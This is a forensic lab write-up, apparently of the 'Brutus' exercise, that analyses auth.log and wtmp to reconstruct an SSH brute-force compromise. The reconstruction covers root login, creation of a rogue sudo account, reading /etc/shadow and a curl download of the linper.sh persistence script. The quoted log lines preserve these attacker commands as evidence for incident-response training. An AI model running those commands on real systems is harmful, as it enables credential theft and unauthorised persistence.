# Brutus

## Credit
Credit: ipag on YouTube. Workflow follows same approach.

## Scenario
Confluence server brute forced over SSH. Review auth.log and wtmp.

## Approach
I use two passes. Pass one answers the questions with shell commands on auth.log and wtmp. Pass two parses auth.log into JSON with grok so the same data works in Elastic or Splunk.

## Why these artifacts
auth.log shows failed logins, accepted logins, sudo activity, and account changes. It is the best source for brute force, persistence, and command use with sudo.
wtmp is the session ledger. It confirms interactive login start and end times, not only the accepted password time.

## Field notes
auth.log includes a timestamp, host, program name, PID, and the message. The program name and message are the fastest way to filter by sshd, sudo, useradd, and systemd-logind.
wtmp is binary. last reads it into a human view. utmpdump is verbose and noisy, so last is the cleaner choice.

## Context and why these logs matter
auth.log records authentication events. It shows failed logins, successful logins, sudo use, and account changes. You use it to confirm brute force, access, persistence, and command execution with sudo.
wtmp records login and logout sessions. It is binary, so you read it with last. You use it to confirm interactive session start and end times.

## Timezone note
<div class="admonition"><strong>Forensic note:</strong> wtmp output uses your system timezone. Set TZ=utc so session times match auth.log and answer format.</div>

## Environment
Set TZ=utc for wtmp output.

## Commands and outputs
Command
```
TZ=utc last -f wtmp
cyberjun pts/1        65.2.161.68      Wed Mar  6 06:37    gone - no logout
root     pts/1        65.2.161.68      Wed Mar  6 06:32 - 06:37  (00:04)
root     pts/0        203.101.190.9    Wed Mar  6 06:19    gone - no logout
reboot   system boot  6.2.0-1018-aws   Wed Mar  6 06:17   still running
root     pts/1        203.101.190.9    Sun Feb 11 10:54 - 11:08  (00:13)
root     pts/1        203.101.190.9    Sun Feb 11 10:41 - 10:41  (00:00)
root     pts/0        203.101.190.9    Sun Feb 11 10:33 - 11:08  (00:34)
root     pts/0        203.101.190.9    Thu Jan 25 11:15 - 12:34  (01:18)
ubuntu   pts/0        203.101.190.9    Thu Jan 25 11:13 - 11:15  (00:01)
reboot   system boot  6.2.0-1017-aws   Thu Jan 25 11:12 - 11:09 (16+23:57)

wtmp begins Thu Jan 25 11:12:17 2024
```

Command
```
awk '{print $5}' auth.log | sed 's/[\[\:].*//g' | sort | uniq -c
      1 chfn
    104 CRON
      3 groupadd
      1 passwd
    257 sshd
      6 sudo
      2 systemd
      8 systemd-logind
      1 useradd
      2 usermod
```

Notes
awk prints field 5.
sed trims after [ or : .
sort groups same strings.
uniq -c counts.

Command
```
grep useradd auth.log
Mar  6 06:34:18 ip-172-31-35-28 useradd[2592]: new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie, shell=/bin/bash, from=/dev/pts/1
```

Command
```
TZ=utc last -f wtmp -F
cyberjun pts/1        65.2.161.68      Wed Mar  6 06:37:35 2024   gone - no logout
root     pts/1        65.2.161.68      Wed Mar  6 06:32:45 2024 - Wed Mar  6 06:37:24 2024  (00:04)
root     pts/0        203.101.190.9    Wed Mar  6 06:19:55 2024   gone - no logout
reboot   system boot  6.2.0-1018-aws   Wed Mar  6 06:17:15 2024   still running
root     pts/1        203.101.190.9    Sun Feb 11 10:54:27 2024 - Sun Feb 11 11:08:04 2024  (00:13)
root     pts/1        203.101.190.9    Sun Feb 11 10:41:11 2024 - Sun Feb 11 10:41:46 2024  (00:00)
root     pts/0        203.101.190.9    Sun Feb 11 10:33:49 2024 - Sun Feb 11 11:08:04 2024  (00:34)
root     pts/0        203.101.190.9    Thu Jan 25 11:15:40 2024 - Thu Jan 25 12:34:34 2024  (01:18)
ubuntu   pts/0        203.101.190.9    Thu Jan 25 11:13:58 2024 - Thu Jan 25 11:15:12 2024  (00:01)
reboot   system boot  6.2.0-1017-aws   Thu Jan 25 11:12:17 2024 - Sun Feb 11 11:09:18 2024 (16+23:57)

wtmp begins Thu Jan 25 11:12:17 2024
```

Below is a snippet of auth.log around the session end and follow-on activity.
Command
```
grep 06:37 auth.log
Mar  6 06:37:01 ip-172-31-35-28 CRON[2654]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
Mar  6 06:37:01 ip-172-31-35-28 CRON[2653]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
Mar  6 06:37:01 ip-172-31-35-28 CRON[2654]: pam_unix(cron:session): session closed for user confluence
Mar  6 06:37:01 ip-172-31-35-28 CRON[2653]: pam_unix(cron:session): session closed for user confluence
Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Received disconnect from 65.2.161.68 port 53184:11: disconnected by user
Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Disconnected from user root 65.2.161.68 port 53184
Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: pam_unix(sshd:session): session closed for user root
Mar  6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Session 37 logged out. Waiting for processes to exit.
Mar  6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Removed session 37.
Mar  6 06:37:34 ip-172-31-35-28 sshd[2667]: Accepted password for cyberjunkie from 65.2.161.68 port 43260 ssh2
Mar  6 06:37:34 ip-172-31-35-28 sshd[2667]: pam_unix(sshd:session): session opened for user cyberjunkie(uid=1002) by (uid=0)
Mar  6 06:37:34 ip-172-31-35-28 systemd-logind[411]: New session 49 of user cyberjunkie.
Mar  6 06:37:34 ip-172-31-35-28 systemd: pam_unix(systemd-user:session): session opened for user cyberjunkie(uid=1002) by (uid=0)
Mar  6 06:37:57 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
Mar  6 06:37:57 ip-172-31-35-28 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by cyberjunkie(uid=1002)
Mar  6 06:37:57 ip-172-31-35-28 sudo: pam_unix(sudo:session): session closed for user roo
```

Brute force evidence
Command
```
grep -oP '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' auth.log | uniq -c | sort
      1 172.31.35.28
      1 203.101.190.9
    210 65.2.161.68
      4 65.2.161.68
```

Command
```
grep -oP ' [0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' auth.log | uniq -c | sort
      1  203.101.190.9
    165  65.2.161.68
```

Command
```
grep 65.2.161.68 auth.log | grep "Failed"
Mar  6 06:31:33 ip-172-31-35-28 sshd[2327]: Failed password for invalid user admin from 65.2.161.68 port 46392 ssh2
Mar  6 06:31:33 ip-172-31-35-28 sshd[2331]: Failed password for invalid user admin from 65.2.161.68 port 46436 ssh2
Mar  6 06:31:33 ip-172-31-35-28 sshd[2332]: Failed password for invalid user admin from 65.2.161.68 port 46444 ssh2
Mar  6 06:31:33 ip-172-31-35-28 sshd[2335]: Failed password for invalid user admin from 65.2.161.68 port 46460 ssh2
Mar  6 06:31:33 ip-172-31-35-28 sshd[2337]: Failed password for invalid user admin from 65.2.161.68 port 46498 ssh2
Mar  6 06:31:33 ip-172-31-35-28 sshd[2334]: Failed password for invalid user admin from 65.2.161.68 port 46454 ssh2
Mar  6 06:31:33 ip-172-31-35-28 sshd[2338]: Failed password for invalid user backup from 65.2.161.68 port 46512 ssh2
Mar  6 06:31:33 ip-172-31-35-28 sshd[2336]: Failed password for invalid user backup from 65.2.161.68 port 46468 ssh2
```

Command
```
grep 65.2.161.68 auth.log | grep -A3 "Accepted"
Mar  6 06:31:40 ip-172-31-35-28 sshd[2411]: Accepted password for root from 65.2.161.68 port 34782 ssh2
Mar  6 06:31:40 ip-172-31-35-28 sshd[2379]: Received disconnect from 65.2.161.68 port 46698:11: Bye Bye [preauth]
Mar  6 06:31:40 ip-172-31-35-28 sshd[2379]: Disconnected from invalid user server_adm 65.2.161.68 port 46698 [preauth]
Mar  6 06:31:40 ip-172-31-35-28 sshd[2380]: Received disconnect from 65.2.161.68 port 46710:11: Bye Bye [preauth]
--
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2
Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Received disconnect from 65.2.161.68 port 53184:11: disconnected by user
Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Disconnected from user root 65.2.161.68 port 53184
Mar  6 06:37:34 ip-172-31-35-28 sshd[2667]: Accepted password for cyberjunkie from 65.2.161.68 port 43260 ssh2
```

Command
```
grep systemd-logind auth.log
Mar  6 06:19:54 ip-172-31-35-28 systemd-logind[411]: New session 6 of user root.
Mar  6 06:31:40 ip-172-31-35-28 systemd-logind[411]: New session 34 of user root.
Mar  6 06:31:40 ip-172-31-35-28 systemd-logind[411]: Session 34 logged out. Waiting for processes to exit.
Mar  6 06:31:40 ip-172-31-35-28 systemd-logind[411]: Removed session 34.
Mar  6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root.
Mar  6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Session 37 logged out. Waiting for processes to exit.
Mar  6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Removed session 37.
Mar  6 06:37:34 ip-172-31-35-28 systemd-logind[411]: New session 49 of user cyberjunkie.
```

Command
```
grep usermod auth.log
Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to group 'sudo'
Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to shadow group 'sudo'
```

Command
```
grep sudo auth.log
Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to group 'sudo'
Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to shadow group 'sudo'
Mar  6 06:37:57 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
Mar  6 06:37:57 ip-172-31-35-28 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by cyberjunkie(uid=1002)
Mar  6 06:37:57 ip-172-31-35-28 sudo: pam_unix(sudo:session): session closed for user root
Mar  6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
Mar  6 06:39:38 ip-172-31-35-28 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by cyberjunkie(uid=1002)
Mar  6 06:39:39 ip-172-31-35-28 sudo: pam_unix(sudo:session): session closed for user root
```

Findings and indicators

| Type | Value | Context |
| --- | --- | --- |
| Attacker IP | 65.2.161.68 | Source of brute force attempts |
| Compromised user | root | Account successfully accessed |
| Persistence user | cyberjunkie | Rogue account created by attacker, UID 1002 |
| Malicious file | linper.sh | Enumeration script fetched with curl |
| Session ID | 37 | Interactive root session in systemd-logind |
| Initial login | 2024-03-06 06:32:45 UTC | Interactive session start in wtmp |
| Session end | 2024-03-06 06:37:24 UTC | Root session closed in auth.log |

Forensic timeline UTC

| Timestamp | Event | Technical detail |
| --- | --- | --- |
| 06:31:33 | Brute force | Failed logins from 65.2.161.68 |
| 06:32:44 | Compromise | Accepted password for root |
| 06:32:45 | Interactive session | Root session starts in wtmp |
| 06:34:18 | Persistence | useradd creates cyberjunkie |
| 06:35:15 | Privilege change | usermod adds cyberjunkie to sudo |
| 06:37:24 | Session end | Session 37 closed |
| 06:37:57 | Credential access | sudo cat /etc/shadow |
| 06:39:38 | Tool transfer | sudo curl downloads linper.sh |

MITRE ATT&CK mapping

| Technique | ID | Evidence | Note |
| --- | --- | --- | --- |
| Create Account | T1136.001 | useradd cyberjunkie | Persistence via local account |
| Account Manipulation | T1098 | usermod adds sudo | Maintains admin access |
| OS Credential Dumping | T1003.008 | sudo cat /etc/shadow | Hash access with root |
| Ingress Tool Transfer | T1105 | curl linper.sh | Brings tooling for discovery |
